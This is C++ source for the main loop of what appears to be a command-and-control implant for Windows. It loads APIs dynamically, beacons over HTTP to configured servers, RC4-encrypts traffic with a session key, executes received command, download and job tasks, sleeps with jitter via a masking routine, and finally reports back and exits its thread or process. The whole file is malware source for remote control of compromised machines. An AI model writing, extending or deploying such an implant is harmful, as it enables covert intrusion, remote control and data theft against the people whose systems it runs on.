#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent*         g_Agent;
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	CHAR* HttpHeaders = g_Agent->CreateHeaders();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();
	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->http_method, g_Agent->config->servers_count, (CHAR**)g_Agent->config->servers, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	ULONG recvDataSize = 0;
	BYTE* recvData     = NULL;

	do {
		if (packerOut->GetDataSize() > 4) {
			packerOut->Set32(0, packerOut->GetDataSize());

			BYTE* data = packerOut->GetData();
			ULONG dataSize = packerOut->GetDataSize();
			EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);

			recvData = g_Connector->SendData( data, dataSize, &recvDataSize);
			
			packerOut->Clear();
			packerOut->Pack32(0);
		}
		else {
			recvData = g_Connector->SendData(NULL, 0, &recvDataSize);
		}

		if (recvData && recvDataSize > g_Agent->config->ans_size) {
			DecryptRC4(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, packerOut);
			MemFreeLocal((LPVOID*)&recvData, recvDataSize);
		}
		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
			WaitMask( g_Agent->config->sleep_delay * 1000, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	BYTE* data     = packerOut->GetData();
	ULONG dataSize = packerOut->GetDataSize();
	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);

	g_Connector->SendData(data, dataSize, &recvDataSize);
	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}